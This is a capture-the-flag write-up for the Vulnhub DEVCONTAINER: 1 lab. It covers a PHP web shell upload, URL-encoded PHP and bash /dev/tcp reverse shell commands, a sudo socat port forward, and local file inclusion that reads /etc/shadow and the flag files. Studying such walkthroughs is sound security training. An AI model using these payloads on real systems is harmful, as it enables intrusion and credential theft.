---
layout: post
title:  "Vulnhub - DEVCONTAINER: 1"
date:   2020-10-09 20:00:00 +1000
category: hacking
---

## Introduction
*Goal: 2 flagas  
Difficulty: Easy-intermediate*

Well, not much to go on here. The box is [DEVCONTAINER: 1](https://www.vulnhub.com/entry/devcontainer-1,548/) from vulnhub.

## Ports
We've got one port only; HTTP on 80.

## HTTP
So with a quick *gobuster* fishing expedition we find an *upload* directory:

>http://192.168.1.97/upload/

And it contains the text: *Allowed file types: jpg,gif,png,zip,txt,xls,doc*  
However, in the page source there is a comment saying *I need to validate file extensions* - so maybe the whitelisting hasn't been implemented yet? Let's see.

I create a file **test.php** with the content:

{% highlight php %}
<?php system($_GET['cmd']);?>
{% endhighlight %}

And try to upload it - it is accepted. So that's great. Now we go fire off a reverse shell:

``
http://192.168.1.97/upload/files/test.php?cmd=php+-r+%27$sock%3dfsockopen(%22192.168.1.77%22,1234)%3bexec(%22/bin/sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%27
``

And we're on the box as **www-data**.

## In a container
We're in a Docker container and there is no *python* or *python3*, which I would normally use to upgrade my shell. Instead I do: 

{% highlight shell %}
/usr/bin/script -qc /bin/bash /dev/null
stty raw -echo; fg; reset
{% endhighlight %}

And that does the job. The suggestion came from [here](https://schtech.co.uk/linux-reverse-shell-without-python/).

In the web directory, there are a couple of interesting things, including this script:

{% highlight shell %}
www-data@1a135ef22c7a:/var/www/html/Maintenance-Web-Docker$ cat maintenance.sh
cat maintenance.sh
#!/bin/bash
#Version 1.0
#This script monitors the uploaded files. It is a reverse shell monitoring measure.
#path= /home/richard/web/webapp/upload/files/
/home/richard/web/Maintenance-Web-Docker/list.sh
{% endhighlight %}

So this executes the **list.sh** script. What's in that?

{% highlight shell %}
www-data@1a135ef22c7a:/var/www/html/Maintenance-Web-Docker$ cat list.sh
cat list.sh
#!/bin/bash
date >> /home/richard/web/Maintenance-Web-Docker/out.txt
ls /home/richard/web/upload/files/ | wc -l >> /home/richard/web/Maintenance-Web-Docker/out.txt
{% endhighlight %}

We have write access to **list.sh**, so what if we add a line to it?

``
www-data@1a135ef22c7a:/var/www/html/Maintenance-Web-Docker$ echo "bash -i >& /dev/tcp/192.168.1.77/1235 0>&1" >> list.sh
``

With a new listener, we get a new shell as **Richard**.

## EC2
From Richard we can get our first flag, user.txt:
*3a6b99f59ea363803bcafc7f5dd9b1e8*

Richard appears to have an interesting capability:

{% highlight shell %}
richard@EC2:~$ sudo -l
sudo -l
Matching Defaults entries for richard on EC2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on EC2:
    (ALL) NOPASSWD: /home/richard/HackTools/socat TCP-LISTEN\:8080\,fork
        TCP\:127.0.0.1\:90
{% endhighlight %}

We can run the command; nothing very interesting seems to happen. I'm not familiar with *socat*, but doing some research shows this is a port forwarding command. We can visit http://192.168.1.97:8080/ in Firefox - and there is a webpage. This port wasn't open previously.

## LFI
The webpage has two links:
>http://192.168.1.97:8080/index.php?view=about-us.html
http://192.168.1.97:8080/index.php?view=contact-us.html

Interestingly, these aren't separate pages, but *view* parameters in index.php (and they don't work). Does anything else work? Yes:

>http://192.168.1.97:8080/index.php?view=../../../../../etc/passwd
http://192.168.1.97:8080/index.php?view=../../../../../etc/shadow
http://192.168.1.97:8080/index.php?view=../../../../../root/proof.txt

So we've got Local File Inclusion and can read both the shadow file *and* the last flag. I copied the root hash and threw John at it but it didn't seem keen to break. 

So we've gotten the flag - but can we also get a shell? Sure, why not.

Since I didn't previously upload a shell (just a command grabber), I need to upload one now - I used the usual *pentestmonkey* shell. Then I can go to:

>http://192.168.1.97:8080/index.php?view=../../../../../../home/richard/web/upload/files/shell.php

And catch a reverse shell as root. Now we really are done.
